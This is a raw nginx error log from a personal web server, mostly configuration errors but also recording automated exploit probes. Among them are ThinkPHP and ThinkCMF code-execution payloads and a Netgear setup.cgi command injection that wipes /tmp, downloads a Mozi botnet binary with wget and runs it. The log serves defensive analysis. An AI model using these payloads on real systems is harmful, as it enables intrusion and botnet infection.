2020/10/12 17:30:04 [error] 63400#63400: *1 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "159.89.17.0"
2020/10/12 17:30:08 [error] 63400#63400: *2 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "159.89.17.0"
2020/10/12 17:31:07 [error] 63400#63400: *6 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 193.27.228.27, server: enpassant.me, request: "GET /solr/admin/info/system?wt=json HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 17:35:47 [error] 63400#63400: *8 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 193.27.228.27, server: enpassant.me, request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 17:38:50 [error] 63400#63400: *9 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "159.89.17.0"
2020/10/12 17:42:54 [error] 63400#63400: *12 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 193.27.228.27, server: enpassant.me, request: "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 17:45:20 [error] 63400#63400: *15 connect() failed (111: Connection refused) while connecting to upstream, client: 185.203.56.36, server: enpassant.me, request: "GET /backend HTTP/1.1", upstream: "http://127.0.0.1:5000/", host: "159.89.17.0"
2020/10/12 17:45:40 [error] 63400#63400: *15 connect() failed (111: Connection refused) while connecting to upstream, client: 185.203.56.36, server: enpassant.me, request: "GET /backend HTTP/1.1", upstream: "http://127.0.0.1:5000/", host: "159.89.17.0"
2020/10/12 17:45:53 [error] 63400#63400: *18 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 193.27.228.27, server: enpassant.me, request: "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 17:52:01 [error] 63400#63400: *19 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 17:52:02 [error] 63400#63400: *20 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/"
2020/10/12 17:52:09 [error] 63400#63400: *21 connect() failed (111: Connection refused) while connecting to upstream, client: 185.203.56.36, server: enpassant.me, request: "GET /backend HTTP/1.1", upstream: "http://127.0.0.1:5000/", host: "enpassant.me"
2020/10/12 17:52:09 [error] 63400#63400: *21 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/backend"
2020/10/12 17:53:56 [error] 63400#63400: *23 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 17:53:56 [error] 63400#63400: *24 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/"
2020/10/12 17:54:02 [error] 63400#63400: *25 connect() failed (111: Connection refused) while connecting to upstream, client: 185.203.56.36, server: enpassant.me, request: "GET /backend HTTP/1.1", upstream: "http://127.0.0.1:5000/", host: "enpassant.me"
2020/10/12 17:54:03 [error] 63400#63400: *25 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/backend"
2020/10/12 17:54:58 [error] 63400#63400: *27 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/backend"
2020/10/12 17:58:52 [error] 63400#63400: *31 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/backend"
2020/10/12 17:59:24 [error] 63400#63400: *33 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/backend"
2020/10/12 18:08:45 [error] 64308#64308: *1 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/backend/"
2020/10/12 18:08:56 [error] 64308#64308: *3 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/backend/games/76561198047135457"
2020/10/12 18:10:12 [error] 64308#64308: *5 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 18:10:12 [error] 64308#64308: *6 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 185.203.56.36, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/"
2020/10/12 18:49:33 [error] 64308#64308: *7 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 2.183.115.191, server: enpassant.me, request: "GET / HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 18:52:25 [error] 64308#64308: *8 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 193.27.228.27, server: enpassant.me, request: "POST /api/jsonws/invoke HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 19:14:18 [error] 64308#64308: *9 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 34.65.141.234, server: enpassant.me, request: "GET /blog/wp-login.php HTTP/1.1", host: "enpassant.me"
2020/10/12 19:37:20 [error] 64308#64308: *14 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 74.120.14.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 19:37:20 [error] 64308#64308: *15 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 74.120.14.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "159.89.17.0"
2020/10/12 20:14:14 [error] 64308#64308: *20 rewrite or internal redirection cycle while internally redirecting to "/index.html", client: 112.238.32.57, server: enpassant.me, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
2020/10/12 20:27:45 [notice] 64901#64901: signal process started
2020/10/12 20:27:51 [error] 64902#64902: *21 directory index of "/var/www/html/" is forbidden, client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 20:27:56 [error] 64902#64902: *21 directory index of "/var/www/html/" is forbidden, client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 20:28:26 [error] 64902#64902: *21 directory index of "/var/www/html/" is forbidden, client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 20:34:23 [notice] 64938#64938: signal process started
2020/10/12 20:34:31 [error] 64939#64939: *22 directory index of "/var/www/html/" is forbidden, client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 20:54:19 [error] 64939#64939: *24 directory index of "/var/www/html/" is forbidden, client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 21:11:18 [error] 64939#64939: *25 directory index of "/var/www/html/" is forbidden, client: 185.203.56.36, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 21:55:03 [notice] 65467#65467: signal process started
2020/10/12 21:55:07 [error] 65468#65468: *27 directory index of "/var/www/html/" is forbidden, client: 212.253.45.119, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 21:55:26 [error] 65468#65468: *27 directory index of "/var/www/html/" is forbidden, client: 212.253.45.119, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 21:59:35 [error] 65468#65468: *29 directory index of "/var/www/html/" is forbidden, client: 103.119.165.1, server: enpassant.me, request: "GET / HTTP/1.1", host: "159.89.17.0:80"
2020/10/12 22:00:40 [notice] 65527#65527: signal process started
2020/10/12 22:00:43 [error] 65528#65528: *30 directory index of "/var/www/html/" is forbidden, client: 212.253.45.119, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 22:00:45 [error] 65528#65528: *30 directory index of "/var/www/html/" is forbidden, client: 212.253.45.119, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 22:00:48 [error] 65528#65528: *30 directory index of "/var/www/html/" is forbidden, client: 212.253.45.119, server: enpassant.me, request: "GET / HTTP/1.1", host: "enpassant.me"
2020/10/12 22:04:15 [notice] 65556#65556: signal process started
2020/10/12 22:10:07 [notice] 66236#66236: signal process started
2020/10/12 22:10:13 [notice] 66248#66248: signal process started
2020/10/12 22:10:16 [notice] 66250#66250: signal process started
2020/10/12 22:10:53 [crit] 66252#66252: *65 SSL_do_handshake() failed (SSL: error:14201044:SSL routines:tls_choose_sigalg:internal error) while SSL handshaking, client: 64.41.200.101, server: 0.0.0.0:443
2020/10/12 22:56:38 [notice] 67020#67020: signal process started
2020/10/12 22:56:43 [notice] 67025#67025: signal process started
2020/10/12 22:57:30 [error] 67026#67026: *224 open() "/usr/share/nginx/html/test" failed (2: No such file or directory), client: 212.253.45.119, server: enpassant.me, request: "GET /test HTTP/1.1", host: "enpassant.me"
2020/10/12 23:03:12 [notice] 67103#67103: signal process started
2020/10/12 23:07:40 [error] 67104#67104: *13 open() "/usr/share/nginx/html/linuxornot" failed (2: No such file or directory), client: 212.253.45.119, server: enpassant.me, request: "GET /linuxornot HTTP/1.1", host: "enpassant.me"
2020/10/12 23:09:21 [notice] 67144#67144: signal process started
2020/10/12 23:10:11 [error] 67145#67145: *19 "/usr/share/nginx/html/phpmyadmin/index.html" is not found (2: No such file or directory), client: 91.135.106.75, server: enpassant.me, request: "GET /phpmyadmin/ HTTP/1.1", host: "159.89.17.0"
2020/10/12 23:30:23 [error] 67193#67193: *7 open() "/usr/share/nginx/html/goform/webLogin" failed (2: No such file or directory), client: 213.202.223.223, server: enpassant.me, request: "POST /goform/webLogin HTTP/1.1", host: "159.89.17.0:80", referrer: "http://159.89.17.0:80/login_inter.asp"
2020/10/12 23:33:30 [notice] 67593#67593: signal process started
2020/10/12 23:35:12 [error] 67594#67594: *8 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 212.253.45.119, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me", referrer: "http://enpassant.me/"
2020/10/12 23:35:21 [error] 67594#67594: *8 open() "/usr/share/nginx/html/linuxornot" failed (2: No such file or directory), client: 212.253.45.119, server: enpassant.me, request: "GET /linuxornot HTTP/1.1", host: "enpassant.me"
2020/10/12 23:39:09 [error] 67594#67594: *11 open() "/usr/share/nginx/html/linuxornot" failed (2: No such file or directory), client: 212.253.45.119, server: enpassant.me, request: "GET /linuxornot HTTP/1.1", host: "enpassant.me"
2020/10/13 00:38:09 [error] 67594#67594: *18 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 27.224.136.207, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "159.89.17.0"
2020/10/13 00:38:10 [error] 67594#67594: *19 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 171.34.177.9, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "159.89.17.0"
2020/10/13 00:38:11 [error] 67594#67594: *20 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 180.95.231.19, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "159.89.17.0"
2020/10/13 00:38:23 [error] 67594#67594: *21 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 171.34.176.205, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "159.89.17.0"
2020/10/13 00:50:47 [error] 67594#67594: *22 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 91.234.62.21, server: enpassant.me, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
2020/10/13 01:46:04 [error] 67594#67594: *27 open() "/usr/share/nginx/html/portal/redlion" failed (2: No such file or directory), client: 192.241.216.130, server: enpassant.me, request: "GET /portal/redlion HTTP/1.1", host: "159.89.17.0"
2020/10/13 02:07:14 [error] 67594#67594: *29 open() "/usr/share/nginx/html/wp/wp-login.php" failed (2: No such file or directory), client: 34.125.89.31, server: enpassant.me, request: "GET /wp/wp-login.php HTTP/1.1", host: "enpassant.me"
2020/10/13 02:49:11 [error] 67594#67594: *32 open() "/usr/share/nginx/html/echo.php" failed (2: No such file or directory), client: 5.188.210.227, server: enpassant.me, request: "GET http://5.188.210.227/echo.php HTTP/1.1", host: "5.188.210.227", referrer: "https://www.google.com/"
2020/10/13 03:18:33 [error] 67594#67594: *34 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 54.149.171.23, server: enpassant.me, request: "GET /favicon.ico HTTP/1.1", host: "enpassant.me"
2020/10/13 08:37:10 [emerg] 69430#69430: unknown directive "index.html" in /etc/nginx/sites-enabled/default:10
2020/10/13 08:37:17 [emerg] 69443#69443: unknown directive "index.html" in /etc/nginx/sites-enabled/default:10
